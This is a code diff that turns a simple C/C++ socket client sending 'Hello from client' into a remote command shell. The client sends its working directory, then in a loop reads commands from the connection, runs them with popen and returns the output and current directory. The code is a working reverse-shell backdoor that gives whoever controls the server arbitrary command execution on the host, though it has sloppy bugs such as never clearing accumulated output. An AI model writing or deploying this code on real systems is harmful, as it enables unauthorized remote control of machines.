@@ -1,18 +1,41 @@
 #include <arpa/inet.h>
+#include <iostream>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/socket.h>
 #include <unistd.h>
 
-#define PORT 8080
+using namespace std;
+
+#define PORT (8080)
+#define SEP ("<SePaRaTor>")
 
 int setup_socket();
 
 int main() {
   int client_fd = setup_socket();
-  char hello[] = "Hello from client";
-  send(client_fd, hello, strlen(hello), 0);
+  char cmd[1024] = { 0 };
+  char cwd[256];
+  getcwd(cwd, 256);
+  send(client_fd, cwd, sizeof(cwd), 0);
+  string result = "";
+  while (true) {
+    memset(cmd, 0, sizeof(cmd));
+    int valread = read(client_fd, cmd, 1024);
+    
+    char temp_result[1024];
+    FILE *fp = popen(cmd, "r");
+
+    while (fgets(temp_result, sizeof(temp_result), fp) != NULL) {
+      result += temp_result;
+    }
+    getcwd(cwd, 256);
+    result += SEP;
+    result += cwd;
+    
+    send(client_fd, result.c_str(), result.length(), 0);
+  }
   close(client_fd);
   return 0;
 }
